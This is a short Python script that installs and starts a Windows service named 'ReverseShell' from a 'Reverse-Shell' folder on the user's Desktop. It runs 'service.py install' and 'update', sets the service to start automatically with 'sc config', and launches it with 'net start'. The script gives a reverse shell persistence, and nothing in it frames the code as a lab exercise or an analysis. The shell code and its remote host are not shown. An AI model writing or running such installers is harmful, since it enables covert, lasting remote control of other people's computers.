import time
from subprocess import Popen, PIPE
import os

if __name__ == '__main__':
    try:
        # Change directory to 'Desktop'.
        os.chdir(os.path.join(os.environ["HOMEPATH"], "Desktop"))
        os.chdir("Reverse-Shell")
        cmd = "python service.py install"
        p = Popen(cmd, stdout=PIPE, stderr=PIPE)
        stdout, stderr = p.communicate()
        print('out: ' + str(stdout))
        print('err: ' + str(stderr))
        cmd = "python service.py update"
        p = Popen(cmd, stdout=PIPE, stderr=PIPE)
        stdout, stderr = p.communicate()
        print('out: ' + str(stdout))
        print('err: ' + str(stderr))
        cmd = "sc config ReverseShell start=auto"
        p = Popen(cmd, stdout=PIPE, stderr=PIPE)
        stdout, stderr = p.communicate()
        print('out: ' + str(stdout))
        print('err: ' + str(stderr))
        cmd = "net start ReverseShell"
        p = Popen(cmd, stdout=PIPE, stderr=PIPE)
        stdout, stderr = p.communicate()
        print('out: ' + str(stdout))
        print('err: ' + str(stderr))
        time.sleep(10000)
    except Exception as e:
        print(e)
